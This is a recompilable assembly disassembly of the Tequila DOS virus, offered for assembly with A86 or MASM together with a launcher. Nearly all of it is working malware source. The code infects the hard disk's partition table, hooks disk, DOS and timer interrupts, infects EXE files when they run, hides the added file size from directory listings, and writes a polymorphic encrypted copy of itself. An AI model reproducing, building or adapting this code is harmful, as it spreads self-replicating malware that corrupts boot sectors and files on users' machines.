                   ;=============================
                   ;      the tequila virus     =
                   ;        a recompilable      =
                   ;         dis-assembly       =
                   ;    specifically designed   =
                   ; for assembly to a COM file =
                   ;  with the A86 assembler.   =
                   ;     ++++++++++++++++++     =
                   ; If you desire a "perfect"  =
                   ; byte for byte source code  =
                   ;match-up, the MASM assembler=
                   ; must be used and the noted =
                   ;instructions must be changed=
                   ; to comply with MASM syntax.=
                   ; In addition, all byte and  =
                   ;word pointer references must=
                   ; be changed from B and W to =
                   ;   BYTE POINTER and WORD    =
                   ;          POINTER.          =
                   ;=============================


CODE_SEG   SEGMENT
ASSUME CS:CODE_SEG, DS:CODE_SEG, ES:CODE_SEG, SS:CODE_SEG
ORG 0100
TEQUILA PROC NEAR

JMP START

  DB 000, 000, 000, 000, 000, 000, 000, 0FFH, 0FFH
  DB 009, 005, 001H, 010H, 000, 000, 002H, 0FAH, 000, 00CH

  DB 00DH, 00AH, 00DH, 00AH
  DB "Welcome to T.TEQUILA's latest production.", 00DH, 00AH
  DB "Contact T.TEQUILA/P.o.Box 543/6312 St'hausen/"
  DB "Switzerland.", 00DH, 00AH
  DB "Loving thoughts to L.I.N.D.A", 00DH, 00AH, 00DH, 00AH
  DB "BEER and TEQUILA forever !", 00DH, 00AH, 00DH, 00AH
  DB "$"

  DB "Execute: mov ax, FE03 / int 21. Key to go on!"


PROGRAM_TERMINATION_ROUTINE:
   PUSH BP
   MOV BP,SP
   SUB SP,0CH
   PUSH AX
   PUSH BX
   PUSH CX
   PUSH DX
   PUSH SI
   PUSH DI
   PUSH ES
   PUSH DS
   PUSH CS
   POP DS
   MOV AX,W[6]
   INC AX
   JE 0243H       	;Masm Mod. Needed
   DEC AX
   JNE 020DH       	;Masm Mod. Needed
   DEC W[8]       	;Masm Mod. Needed
   JNE 0243H       	;Masm Mod. Needed
   JMP 0246H       	;Masm Mod. Needed
   MOV AH,02AH
   CALL INT_21
   MOV SI,CX
   MOV CX,W[8]
   CMP CL,DL
   JNE 022FH       	;Masm Mod. Needed
   MOV AX,SI
   SUB AX,W[6]
   MUL B[011H]       	;Masm Mod. Needed
   ADD AL,DH
   ADD CH,3
   CMP AL,CH
   JAE 0237H       	;Masm Mod. Needed
   MOV W[6],0FFFFH       	;Masm Mod. Needed
   JMP 0243H       	;Masm Mod. Needed
   MOV W[6],0       	;Masm Mod. Needed
   MOV W[8],3       	;Masm Mod. Needed
   JMP 02DF       	;Masm Mod. Needed
   MOV BX,0B800H
   INT 011
   AND AX,030H
   CMP AX,030H
   JNE 0256H       	;Masm Mod. Needed
   MOV BX,0B000H
   MOV ES,BX
   XOR BX,BX
   MOV DI,0FD8FH
   MOV SI,0FC18H
   MOV W[BP-2],SI
   MOV W[BP-4],DI
   MOV CX,01E
   MOV AX,W[BP-2]
   IMUL AX
   MOV W[BP-8],AX
   MOV W[BP-6],DX
   MOV AX,W[BP-4]
   IMUL AX
   MOV W[BP-0C],AX
   MOV W[BP-0A],DX
   ADD AX,W[BP-8]
   ADC DX,W[BP-6]
   CMP DX,0F
   JAE 02B0       	;Masm Mod. Needed
   MOV AX,W[BP-2]
   IMUL W[BP-4]
   IDIV W[0F]       	;Masm Mod. Needed
   ADD AX,DI
   MOV W[BP-4],AX
   MOV AX,W[BP-8]
   MOV DX,W[BP-6]
   SUB AX,W[BP-0C]
   SBB DX,W[BP-0A]
   IDIV W[0D]       	;Masm Mod. Needed
   ADD AX,SI
   MOV W[BP-2],AX
   LOOP 0269       	;Masm Mod. Needed
   INC CX
   SHR CL,1
   MOV CH,CL
   MOV CL,0DB
   ES MOV W[BX],CX       	;Masm Mod. Needed
   INC BX
   INC BX
   ADD SI,012
   CMP SI,01B8
   JL 0260       	;Masm Mod. Needed
   ADD DI,034
   CMP DI,02A3
   JL 025D       	;Masm Mod. Needed
   XOR DI,DI
   MOV SI,0BB
   MOV CX,02D
   CLD
   MOVSB
   INC DI
   LOOP 02D7       	;Masm Mod. Needed
   XOR AX,AX
   INT 016
   POP DS
   POP ES
   POP DI
   POP SI
   POP DX
   POP CX
   POP BX
   POP AX
   MOV SP,BP
   POP BP
   RET

PRINT_MESSAGE:
   PUSH DX
   PUSH DS
   PUSH CS
   POP DS
   MOV AH,9
   MOV DX,012
   CALL INT_21
   POP DS
   POP DX
   RET

NEW_PARTITION_TABLE:
   CLI
   XOR BX,BX
   MOV DS,BX
   MOV SS,BX
   MOV SP,07C00
   STI
   XOR DI,DI
   SUB W[0413],3       	;Masm Mod. Needed
   INT 012
   MOV CL,6
   SHL AX,CL
   MOV ES,AX
   PUSH ES
   MOV AX,022A
   PUSH AX
   MOV AX,0205
   MOV CX,W[07C30]
   INC CX
   MOV DX,W[07C32]
   INT 013
   RETF

DB 002, 0FE                      
DB 04C, 0E9 
DB 080, 004                

   PUSH CS
   POP DS
   XOR AX,AX
   MOV ES,AX
   MOV BX,07C00
   PUSH ES
   PUSH BX
   MOV AX,0201
   MOV CX,W[0226]
   MOV DX,W[0228]
   INT 013
   PUSH CS
   POP ES
   CLD
   MOV SI,0409
   MOV DI,09BE
   MOV CX,046
   REP MOVSB
   MOV SI,091B
   MOV DI,0A04
   MOV CX,045
   REP MOVSB
   CLI
   XOR AX,AX
   MOV ES,AX
   ES LES BX,[070]       	;Masm Mod. Needed
   MOV W[09B0],BX       	;Masm Mod. Needed
   MOV W[09B2],ES       	;Masm Mod. Needed
   MOV ES,AX
   ES LES BX,[084]       	;Masm Mod. Needed
   MOV W[09B4],BX       	;Masm Mod. Needed
   MOV W[09B6],ES       	;Masm Mod. Needed
   MOV ES,AX
   ES MOV W[070],044F       	;Masm Mod. Needed
   ES MOV W[072],DS       	;Masm Mod. Needed
   STI
   RETF

INSTALL:
   CALL NEXT_LINE
 NEXT_LINE:
   POP SI
   SUB SI,028F
   PUSH SI
   PUSH AX
   PUSH ES
   PUSH CS
   POP DS
   MOV AX,ES
   ADD W[SI+2],AX
   ADD W[SI+4],AX
   DEC AX
   MOV ES,AX
   MOV AX,0FE02
   INT 021
   CMP AX,01FD
   JE NO_PARTITION_INFECTION
   ES CMP B[0],05A       	;Masm Mod. Needed
   JNE NO_PARTITION_INFECTION
   ES CMP W[3],0BB       	;Masm Mod. Needed
   JBE NO_PARTITION_INFECTION
   ES MOV AX,W[012]       	;Masm Mod. Needed
   SUB AX,0BB
   MOV ES,AX
   XOR DI,DI
   MOV CX,09A4
   CLD
   REP MOVSB
   PUSH ES
   POP DS
   CALL INFECT_PARTITION_TABLE
 NO_PARTITION_INFECTION:
   POP ES
   POP AX
   PUSH ES
   POP DS
   POP SI
   CS MOV SS,W[SI+4]       	;Masm Mod. Needed
 CHAIN_TO_THE_HOST_FILE:
   CS JMP D[SI]       	;Masm Mod. Needed

INFECT_PARTITION_TABLE:
   MOV AH,02A
   INT 021
   MOV W[6],CX       	;Masm Mod. Needed
   MOV W[8],DX       	;Masm Mod. Needed
   MOV AH,052
   INT 021
   ES MOV AX,W[BX-2]       	;Masm Mod. Needed
   MOV W[03E8],AX       	;Masm Mod. Needed
   MOV AX,03513
   INT 021
   MOV W[09A0],BX       	;Masm Mod. Needed
   MOV W[09A2],ES       	;Masm Mod. Needed
   MOV AX,03501
   INT 021
   MOV SI,BX
   MOV DI,ES
   MOV AX,02501
   MOV DX,03DA
   INT 021
   MOV B[0A],0       	;Masm Mod. Needed
   PUSHF
   POP AX
   OR AX,0100
   PUSH AX
   POPF
   MOV AX,0201
   MOV BX,09A4
   MOV CX,1
   MOV DX,080
   PUSH DS
   POP ES
   PUSHF
   CALL D[09A0]       	;Masm Mod. Needed
   PUSHF
   POP AX
   AND AX,0FEFF
   PUSH AX
   POPF
   PUSHF
   MOV AX,02501
   MOV DX,SI
   MOV DS,DI
   INT 021
   POPF
   JAE 0450       	;Masm Mod. Needed
   JMP RET       	;Masm Mod. Needed
   PUSH ES
   POP DS
   CMP W[BX+02E],0FE02
   JNE 045C       	;Masm Mod. Needed
   JMP RET       	;Masm Mod. Needed
   ADD BX,01BE
   MOV CX,4
   MOV AL,B[BX+4]
   CMP AL,4
   JE 0479       	;Masm Mod. Needed
   CMP AL,6
   JE 0479       	;Masm Mod. Needed
   CMP AL,1
   JE 0479       	;Masm Mod. Needed
   ADD BX,010
   LOOP 0463       	;Masm Mod. Needed
   JMP SHORT RET       	;Masm Mod. Needed
   MOV DL,080
   MOV DH,B[BX+5]
   MOV W[0228],DX       	;Masm Mod. Needed
   MOV AX,W[BX+6]
   MOV CX,AX
   MOV SI,6
   AND AX,03F
   CMP AX,SI
   JBE RET       	;Masm Mod. Needed
   SUB CX,SI
   MOV DI,BX
   INC CX
   MOV W[0226],CX       	;Masm Mod. Needed
   MOV AX,0301
   MOV BX,09A4
   PUSHF
   CALL D[09A0]       	;Masm Mod. Needed
   JB RET       	;Masm Mod. Needed
   DEC CX
   MOV W[DI+6],CX
   INC CX
   SUB W[DI+0C],SI
   SBB W[DI+0E],0
   MOV AX,0305
   MOV BX,0
   INC CX
   PUSHF
   CALL D[09A0]       	;Masm Mod. Needed
   JB RET       	;Masm Mod. Needed
   MOV SI,01F6
   MOV DI,09A4
   MOV CX,034
   CLD
   REP MOVSB
   MOV AX,0301
   MOV BX,09A4
   MOV CX,1
   XOR DH,DH
   PUSHF
   CALL D[09A0]       	;Masm Mod. Needed
   RET

NEW_INTERRUPT_ONE:
   PUSH BP
   MOV BP,SP
   CS CMP B[0A],1       	;Masm Mod. Needed
   JE 0506       	;Masm Mod. Needed
   CMP W[BP+4],09B4
   JA 050B       	;Masm Mod. Needed
   PUSH AX
   PUSH ES
   LES AX,[BP+2]
   CS MOV W[09A0],AX       	;Masm Mod. Needed
   CS MOV W[09A2],ES       	;Masm Mod. Needed
   CS MOV B[0A],1
   POP ES
   POP AX
   AND W[BP+6],0FEFF
   POP BP
   IRET

NEW_INTERRUPT_13:
   CMP CX,1
   JNE 054E       	;Masm Mod. Needed
   CMP DX,080
   JNE 054E       	;Masm Mod. Needed
   CMP AH,3
   JA 054E       	;Masm Mod. Needed
   CMP AH,2
   JB 054E       	;Masm Mod. Needed
   PUSH CX
   PUSH DX
   DEC AL
   JE 0537       	;Masm Mod. Needed
   PUSH AX
   PUSH BX
   ADD BX,0200
   INC CX
   PUSHF
   CS CALL D[09A0]       	;Masm Mod. Needed
   POP BX
   POP AX
   MOV AL,1
   CS MOV CX,W[0226]       	;Masm Mod. Needed
   CS MOV DX,W[0228]       	;Masm Mod. Needed
   PUSHF
   CS CALL D[09A0]       	;Masm Mod. Needed
   POP DX
   POP CX
   RETF 2
   CS JMP D[09A0]       	;Masm Mod. Needed

NEW_TIMER_TICK_INTERRUPT:
   PUSH AX
   PUSH BX
   PUSH ES
   PUSH DS
   XOR AX,AX
   MOV ES,AX
   PUSH CS
   POP DS
   ES LES BX,[084]       	;Masm Mod. Needed
   MOV AX,ES
   CMP AX,0800
   JA 05B0       	;Masm Mod. Needed
   CMP AX,W[09B6]
   JNE 0575       	;Masm Mod. Needed
   CMP BX,W[09B4]
   JE 05B0       	;Masm Mod. Needed
   MOV W[09B4],BX       	;Masm Mod. Needed
   MOV W[09B6],ES       	;Masm Mod. Needed
   XOR AX,AX
   MOV DS,AX
   CS LES BX,[09B0]       	;Masm Mod. Needed
   MOV W[070],BX       	;Masm Mod. Needed
   MOV W[072],ES       	;Masm Mod. Needed
   LES BX,[04C]       	;Masm Mod. Needed
   CS MOV W[09A0],BX       	;Masm Mod. Needed
   CS MOV W[09A2],ES       	;Masm Mod. Needed
   MOV W[04C],09BE       	;Masm Mod. Needed
   MOV W[04E],CS       	;Masm Mod. Needed
   MOV W[084],04B1       	;Masm Mod. Needed
   MOV W[086],CS       	;Masm Mod. Needed
   POP DS
   POP ES
   POP BX
   POP AX
   IRET

INT_21_INTERCEPT:
   CMP AH,011
   JB CHECK_FOR_HANDLE
   CMP AH,012
   JA CHECK_FOR_HANDLE
   CALL ADJUST_FCB_MATCHES
   RETF 2
 CHECK_FOR_HANDLE:
   CMP AH,04E
   JB CHECK_FOR_PREVIOUS_INSTALLATION
   CMP AH,04F
   JA CHECK_FOR_PREVIOUS_INSTALLATION
   CALL ADJUST_HANDLE_MATCHES
   RETF 2
 CHECK_FOR_PREVIOUS_INSTALLATION:
   CMP AX,0FE02
   JNE CHECK_FOR_MESSAGE_PRINT
   NOT AX
   IRET
 CHECK_FOR_MESSAGE_PRINT:
   CMP AX,0FE03
   JNE CHECK_FOR_EXECUTE
   CS CMP W[6],0       	;Masm Mod. Needed
   JNE CHAIN_TO_TRUE_INT_21
   CALL PRINT_MESSAGE
   IRET
 CHECK_FOR_EXECUTE:
   CMP AX,04B00
   JE SET_STACK
   CMP AH,04C
   JNE CHAIN_TO_TRUE_INT_21
 SET_STACK:
   CS MOV W[09A6],SP       	;Masm Mod. Needed
   CS MOV W[09A8],SS       	;Masm Mod. Needed
   CLI
   PUSH CS
   POP SS
   MOV SP,0AE5
   STI
   CMP AH,04C
   JNE TO_AN_INFECTION
   CALL PROGRAM_TERMINATION_ROUTINE
   JMP SHORT NO_INFECTION
 TO_AN_INFECTION:
   CALL INFECT_THE_FILE
 NO_INFECTION:
   CLI
   CS MOV SS,W[09A8]       	;Masm Mod. Needed
   CS MOV SP,W[09A6]       	;Masm Mod. Needed
   STI
   JMP SHORT CHAIN_TO_TRUE_INT_21
 CHAIN_TO_TRUE_INT_21:
   CS INC W[09BC]       	;Masm Mod. Needed
   CS JMP D[09B4]       	;Masm Mod. Needed

NEW_CRITICAL_ERROR_HANDLER:
   MOV AL,3
   IRET

ADJUST_FCB_MATCHES:
   PUSH BX
   PUSH ES
   PUSH AX
   MOV AH,02F
   CALL INT_21
   POP AX
   PUSHF
   CS CALL D[09B4]       	;Masm Mod. Needed
   PUSHF
   PUSH AX
   CMP AL,0FF
   JE 0664       	;Masm Mod. Needed
   ES CMP B[BX],0FF       	;Masm Mod. Needed
   JNE 064F       	;Masm Mod. Needed
   ADD BX,7
   ES MOV AL,B[BX+017]       	;Masm Mod. Needed
   AND AL,01F
   CMP AL,01F
   JNE 0664       	;Masm Mod. Needed
   ES SUB W[BX+01D],09A4       	;Masm Mod. Needed
   ES SBB W[BX+01F],0       	;Masm Mod. Needed
   POP AX
   POPF
   POP ES
   POP BX
   RET

ADJUST_HANDLE_MATCHES:
   PUSH BX
   PUSH ES
   PUSH AX
   MOV AH,02F
   CALL INT_21
   POP AX
   PUSHF
   CS CALL D[09B4]       	;Masm Mod. Needed
   PUSHF
   PUSH AX
   JB 0691       	;Masm Mod. Needed
   ES MOV AL,B[BX+016]       	;Masm Mod. Needed
   AND AL,01F
   CMP AL,01F
   JNE 0691       	;Masm Mod. Needed
   ES SUB W[BX+01A],09A4       	;Masm Mod. Needed
   ES SBB W[BX+01C],0       	;Masm Mod. Needed
   POP AX
   POPF
   POP ES
   POP BX
   RET

WRITE_TO_THE_FILE:
   MOV AH,040
   JMP 069C       	;Masm Mod. Needed

READ_FROM_THE_FILE:
   MOV AH,03F
   CALL 06B4       	;Masm Mod. Needed
   JB RET       	;Masm Mod. Needed
   SUB AX,CX
   RET

MOVE_TO_END_OF_FILE:
   XOR CX,CX
   XOR DX,DX
   MOV AX,04202
   JMP 06B4       	;Masm Mod. Needed

MOVE_TO_BEGINNING_OF_FILE:
   XOR CX,CX
   XOR DX,DX
   MOV AX,04200
   CS MOV BX,W[09A4]       	;Masm Mod. Needed

INT_21:
   CLI
   PUSHF
   CS CALL D[09B4]       	;Masm Mod. Needed
   RET

INFECT_THE_FILE:
   PUSH AX
   PUSH BX
   PUSH CX
   PUSH DX
   PUSH SI
   PUSH DI
   PUSH ES
   PUSH DS
   CALL CHECK_LETTERS_IN_FILENAME
   JAE GOOD_NAME
   JMP BAD_NAME

GOOD_NAME:
   PUSH DX
   PUSH DS
   PUSH CS
   POP DS

SAVE_AND_REPLACE_CRITICAL_ERROR_HANDLER:
   MOV AX,03524
   CALL INT_21
   MOV W[09B8],BX       	;Masm Mod. Needed
   MOV W[09BA],ES       	;Masm Mod. Needed
   MOV AX,02524
   MOV DX,052A
   CALL INT_21
   POP DS
   POP DX

SAVE_AND_REPLACE_FILE_ATTRIBUTE:
   MOV AX,04300
   CALL INT_21
   CS MOV W[09AA],CX       	;Masm Mod. Needed
   JAE 06FE       	;Masm Mod. Needed
   JMP RESTORE_CRIT_HANDLER
   MOV AX,04301
   XOR CX,CX
   CALL INT_21
   JB 077C       	;Masm Mod. Needed

OPEN_FILE_FOR_READ_WRITE:
   MOV AX,03D02
   CALL INT_21
   JB 0771       	;Masm Mod. Needed
   PUSH DX
   PUSH DS
   PUSH CS
   POP DS
   MOV W[09A4],AX       	;Masm Mod. Needed

GET_FILEDATE:
   MOV AX,05700
   CALL 06B4       	;Masm Mod. Needed
   JB 075C       	;Masm Mod. Needed
   MOV W[09AC],DX       	;Masm Mod. Needed
   MOV W[09AE],CX       	;Masm Mod. Needed

READ_AND_CHECK_EXE_HEADER:
   CALL 06AD       	;Masm Mod. Needed
   MOV DX,0A49
   MOV CX,01C
   CALL 069A       	;Masm Mod. Needed
   JB 075C       	;Masm Mod. Needed
   PUSH DS
   POP ES
   MOV DI,0E8
   MOV CX,020
   CMP W[0A49],05A4D       	;Masm Mod. Needed
   JNE 075C       	;Masm Mod. Needed
   MOV AX,W[0A5B]
   CLD
   REPNE SCASW
   JNE 0754       	;Masm Mod. Needed
   OR W[09AE],01F       	;Masm Mod. Needed
   JMP 075C       	;Masm Mod. Needed
   CALL READ_PAST_END_OF_FILE
   JB 075C       	;Masm Mod. Needed
   CALL ENCRYPT_AND_WRITE_TO_FILE

RESTORE_ALTERED_DATE:
   MOV AX,05701
   MOV DX,W[09AC]
   MOV CX,W[09AE]
   CALL 06B4       	;Masm Mod. Needed

CLOSE_THE_FILE:
   MOV AH,03E
   CALL 06B4       	;Masm Mod. Needed

RESTORE_FILE_ATTRIBUTE:
   POP DS
   POP DX
   MOV AX,04301
   CS MOV CX,W[09AA]       	;Masm Mod. Needed
   CALL INT_21

RESTORE_CRIT_HANDLER:
   MOV AX,02524
   CS LDS DX,[09B8]       	;Masm Mod. Needed
   CALL INT_21

BAD_NAME:
   POP DS
   POP ES
   POP DI
   POP SI
   POP DX
   POP CX
   POP BX
   POP AX
   RET

CHECK_LETTERS_IN_FILENAME:
   PUSH DS
   POP ES
   MOV DI,DX
   MOV CX,-1
   XOR AL,AL
   CLD
   REPNE SCASB
   NOT CX
   MOV DI,DX
   MOV AX,04353
   MOV SI,CX
   SCASW
   JE 07B7       	;Masm Mod. Needed
   DEC DI
   LOOP 07A5       	;Masm Mod. Needed
   MOV CX,SI
   MOV DI,DX
   MOV AL,056
   REPNE SCASB
   JE 07B7       	;Masm Mod. Needed
   CLC
   RET
   STC
   RET

READ_PAST_END_OF_FILE:
   MOV CX,-1
   MOV DX,-0A
   CALL 06A8       	;Masm Mod. Needed
   MOV DX,0A65
   MOV CX,8
   CALL 069A       	;Masm Mod. Needed
   JB RET       	;Masm Mod. Needed
   CMP W[0A65],0FDF0       	;Masm Mod. Needed
   JNE 07F0       	;Masm Mod. Needed
   CMP W[0A67],0AAC5       	;Masm Mod. Needed
   JNE 07F0       	;Masm Mod. Needed
   MOV CX,-1
   MOV DX,-9
   CALL 06A8       	;Masm Mod. Needed
   MOV DX,0A6B
   MOV CX,4
   CALL 0696       	;Masm Mod. Needed
   RET
   CLC
   RET

ENCRYPT_AND_WRITE_TO_FILE:
   CALL MOVE_TO_END_OF_FILE
   MOV SI,AX
   MOV DI,DX
   MOV BX,0A49
   MOV AX,W[BX+4]
   MUL W[0D]       	;Masm Mod. Needed
   SUB AX,SI
   SBB DX,DI
   JAE 080C       	;Masm Mod. Needed
   JMP OUT_OF_ENCRYPT
   MOV AX,W[BX+8]
   MUL W[0B]       	;Masm Mod. Needed
   SUB SI,AX
   SBB DI,DX
   MOV AX,W[BX+0E]
   MOV W[4],AX       	;Masm Mod. Needed
   ADD W[4],010       	;Masm Mod. Needed
   MUL W[0B]       	;Masm Mod. Needed
   ADD AX,W[BX+010]
   SUB AX,SI
   SBB DX,DI
   JB 083C       	;Masm Mod. Needed
   SUB AX,080
   SBB DX,0
   JB RET       	;Masm Mod. Needed
   ADD W[BX+0E],09B
   MOV AX,W[BX+016]
   ADD AX,010
   MOV W[2],AX       	;Masm Mod. Needed
   MOV AX,W[BX+014]
   MOV W[0],AX       	;Masm Mod. Needed
   CALL 06A4       	;Masm Mod. Needed
   ADD AX,09A4
   ADC DX,0
   DIV W[0D]       	;Masm Mod. Needed
   INC AX
   MOV W[0A4D],AX       	;Masm Mod. Needed
   MOV W[0A4B],DX       	;Masm Mod. Needed
   MOV DX,DI
   MOV AX,SI
   DIV W[0B]       	;Masm Mod. Needed
   MOV W[0A5F],AX       	;Masm Mod. Needed
   MOV BX,DX
   ADD DX,0960
   MOV W[0A5D],DX       	;Masm Mod. Needed
   CALL COPY_TO_HIGH_MEMORY_ENCRYPT_WRITE
   JB RET       	;Masm Mod. Needed
   OR W[09AE],01F       	;Masm Mod. Needed
   MOV BX,W[09BC]
   AND BX,01F
   SHL BX,1
   MOV AX,W[BX+0E8]
   MOV W[0A5B],AX       	;Masm Mod. Needed
   CALL MOVE_TO_BEGINNING_OF_FILE
   MOV CX,01C
   MOV DX,0A49

WRITE_THE_NEW_HEADER:
   CALL 0696       	;Masm Mod. Needed
 OUT_OF_ENCRYPT:
   RET

COPY_TO_HIGH_MEMORY_ENCRYPT_WRITE:
   PUSH BP
   XOR AH,AH
   INT 01A
   MOV AX,DX
   MOV BP,DX
   PUSH DS
   POP ES
   MOV DI,0960
   MOV SI,DI
   MOV CX,020
   CLD
   REP STOSW
   XOR DX,DX
   MOV ES,DX
   CALL ENCRYPT_STEP_ONE
   CALL ENCRYPT_STEP_TWO
   CALL ENCRYPT_STEP_THREE
   MOV B[SI],0E9
   MOV DI,028C
   SUB DI,SI
   SUB DI,3
   INC SI
   MOV W[SI],DI
   MOV AX,0A04
   CALL AX
   POP BP
   RET

ENCRYPT_STEP_ONE:
   DEC BP
   ES TEST B[BP],2       	;Masm Mod. Needed
   JNE 08EB       	;Masm Mod. Needed
   MOV B[SI],0E
   INC SI
   CALL GARBLER
   MOV B[SI],01F
   INC SI
   CALL GARBLER
   RET
   MOV W[SI],0CB8C
   INC SI
   INC SI
   CALL GARBLER
   MOV W[SI],0DB8E
   INC SI
   INC SI
   CALL GARBLER
   RET

ENCRYPT_STEP_TWO:
   AND CH,0FE
   DEC BP
   ES TEST B[BP],2       	;Masm Mod. Needed
   JE 0920       	;Masm Mod. Needed
   OR CH,1
   MOV B[SI],0BE
   INC SI
   MOV W[SI],BX
   INC SI
   INC SI
   CALL GARBLER
   ADD BX,0960
   TEST CH,1
   JE 0934       	;Masm Mod. Needed
   MOV B[SI],0BB
   INC SI
   MOV W[SI],BX
   INC SI
   INC SI
   CALL GARBLER
   ADD BX,0960
   TEST CH,1
   JE 090C       	;Masm Mod. Needed
   SUB BX,0960
   CALL GARBLER
   MOV B[SI],0B9
   INC SI
   MOV AX,0960
   MOV W[SI],AX
   INC SI
   INC SI
   CALL GARBLER
   CALL GARBLER
   RET

ENCRYPT_STEP_THREE:
   MOV AH,014
   MOV DH,017
   TEST CH,1
   JE 0958       	;Masm Mod. Needed
   XCHG DH,AH
   MOV DI,SI
   MOV AL,08A
   MOV W[SI],AX
   INC SI
   INC SI
   CALL GARBLER
   XOR DL,DL
   MOV B[0A39],028       	;Masm Mod. Needed
   DEC BP
   ES TEST B[BP],2       	;Masm Mod. Needed
   JE 0978       	;Masm Mod. Needed
   MOV DL,030
   MOV B[0A39],DL       	;Masm Mod. Needed
   MOV W[SI],DX
   INC SI
   INC SI
   MOV W[SI],04346
   INC SI
   INC SI
   CALL GARBLER
   MOV AX,0FE81
   MOV CL,0BE
   TEST CH,1
   JE 0993       	;Masm Mod. Needed
   MOV AH,0FB
   MOV CL,0BB
   MOV W[SI],AX
   INC SI
   INC SI
   PUSH BX
   ADD BX,040
   MOV W[SI],BX
   INC SI
   INC SI
   POP BX
   MOV B[SI],072
   INC SI
   MOV DX,SI
   INC SI
   CALL GARBLER
   MOV B[SI],CL
   INC SI
   MOV W[SI],BX
   INC SI
   INC SI
   MOV AX,SI
   SUB AX,DX
   DEC AX
   MOV BX,DX
   MOV B[BX],AL
   CALL GARBLER
   CALL GARBLER
   MOV B[SI],0E2
   INC SI
   SUB DI,SI
   DEC DI
   MOV AX,DI
   MOV B[SI],AL
   INC SI
   CALL GARBLER
   RET

GARBLER:
   DEC BP
   ES TEST B[BP],0F       	;Masm Mod. Needed
   JE RET       	;Masm Mod. Needed
   DEC BP
   ES MOV AL,B[BP]       	;Masm Mod. Needed
   TEST AL,2
   JE 0A0E       	;Masm Mod. Needed
   TEST AL,4
   JE 09F7       	;Masm Mod. Needed
   TEST AL,8
   JE 09F1       	;Masm Mod. Needed
   MOV W[SI],0C789
   INC SI
   INC SI
   JMP RET       	;Masm Mod. Needed
   MOV B[SI],090
   INC SI
   JMP RET       	;Masm Mod. Needed
   MOV AL,085
   DEC BP
   ES MOV AH,B[BP]       	;Masm Mod. Needed
   TEST AH,2
   JE 0A05       	;Masm Mod. Needed
   DEC AL
   OR AH,0C0
   MOV W[SI],AX
   INC SI
   INC SI
   JMP RET       	;Masm Mod. Needed
   DEC BP
   ES TEST B[BP],2       	;Masm Mod. Needed
   JE 0A1A       	;Masm Mod. Needed
   MOV AL,039
   JMP 09F9       	;Masm Mod. Needed
   MOV B[SI],0FC
   INC SI
   RET

MAKE_THE_DISK_WRITE:
   CALL PERFORM_ENCRYPTION_DECRYPTION
   MOV AH,040
   MOV BX,W[09A4]
   MOV DX,0
   MOV CX,09A4
   PUSHF
   CALL D[09B4]       	;Masm Mod. Needed
   JB 0A37       	;Masm Mod. Needed
   SUB AX,CX
   PUSHF
   CMP B[0A39],028       	;Masm Mod. Needed
   JNE 0A44       	;Masm Mod. Needed
   MOV B[0A39],0       	;Masm Mod. Needed
   CALL PERFORM_ENCRYPTION_DECRYPTION
   POPF
   RET

PERFORM_ENCRYPTION_DECRYPTION:
   MOV BX,0
   MOV SI,0960
   MOV CX,0960
   MOV DL,B[SI]
   XOR B[BX],DL
   INC SI
   INC BX
   CMP SI,09A0
   JB 0A61       	;Masm Mod. Needed
   MOV SI,0960
   LOOP 0A52       	;Masm Mod. Needed
   RET

THE_FILE_DECRYPTING_ROUTINE:
   PUSH CS
   POP DS
   MOV BX,4
   MOV SI,0964
   MOV CX,0960
   MOV DL,B[SI]
   ADD B[BX],DL
   INC SI
   INC BX
   CMP SI,09A4
   JB 0A7E       	;Masm Mod. Needed
   MOV SI,0964
   LOOP 0A6F       	;Masm Mod. Needed
   JMP 0390       	;Masm Mod. Needed

;========== THE FOLLOWING IS NOT PART OF THE VIRUS ========
;==========       BUT IS MERELY THE BOOSTER.       ========

START:
   LEA W[0104],EXIT       	;Masm Mod. Needed
   MOV W[0106],CS       	;Masm Mod. Needed
   MOV BX,CS
   SUB W[0106],BX       	;Masm Mod. Needed
   JMP INSTALL

EXIT:
   INT 020

TEQUILA ENDP
CODE_SEG ENDS
END TEQUILA